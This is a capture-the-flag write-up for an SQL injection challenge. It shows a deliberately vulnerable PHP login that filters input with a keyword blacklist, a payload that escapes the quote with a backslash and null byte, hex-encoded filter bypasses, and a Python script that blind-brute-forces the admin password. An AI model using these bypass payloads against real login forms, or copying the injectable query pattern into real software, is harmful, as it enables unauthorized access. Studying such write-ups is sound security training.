# BSides-Delhi-CTF-2018-Old-School-SQL

``` 
Being the admin is great
Link(http://35.200.215.237/)
```

# Source Code

```
<?php 
include "./config.php";
include "./flag.php";
error_reporting(0);

$black_list = "/admin|guest|limit|by|substr|mid|like|or|char|union|select|greatest|%00|\'|";
$black_list .= "=|_| |in|<|>|-|chal|_|\.|\(\)|#|and|if|database|where|concat|insert|having|sleep/i";
if(preg_match($black_list, $_GET['user'])) exit(":P"); 
if(preg_match($black_list, $_GET['pw'])) exit(":P"); 


$query="select user from chal where user='$_GET[user]' and pw='$_GET[pw]'"; 

$result = mysql_query($query);
$result = mysql_fetch_array($result);
$admin_pass = mysql_fetch_array(mysql_query("select pw from chal where user='admin'"));
echo "<h1>query : <strong><b>{$query}</b></strong><br></h1>";
if($result['user']) echo "<h2>Welcome {$result['user']}</h2>"; 
if(($admin_pass['pw'])&&($admin_pass['pw'] === $_GET['pw'])){
    echo $flag;
}

highlight_file(__FILE__); 

?>
```

Here the single quote `'` is blocked by php preg_match so first we need to bypass the query 

```
select user from chal where user='\' and pw=';%00'
```
now `and pw=` are consider as a string and we can write our query to get try to get the flag
i try to write the subquery to get the flag but i found that most of the sql keywords are blocked by preg_match. so i tried to pass the HEX format in the query.

```
GET /?user=\&pw=||(0x313D31);%00
```
it works but i did not get flag, as we need the password to print the flag, so we need to apply the brute force to get the flag. let write a script to crack the password

```
import requests
url = "http://35.200.215.237/?user=\&pw=||(user/**/regexp/**/0x61646d696e/**/%26%26/**/pw/**/regexp/**/%22^"

character = [1,2,3,4,5,6,7,8,9,0,'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
passowrd_length = 10
password = ""
for i in range(1,passowrd_length):
    password_found = False
    for c in character:
        query = url+(password+str(c)+"%22);%00")
        send_query = requests.get(query)
        if "Welcome admin" in send_query.text:
            password = password + str(c)
            password_found = True
            break
    if password_found == False:
        break

print(password)
```

this print out the password ``` 17292115 ```

and after passing the passowrd we found the flag i.e flag{sQ1_inj3c7i0n_i5_v3ry_3asy}



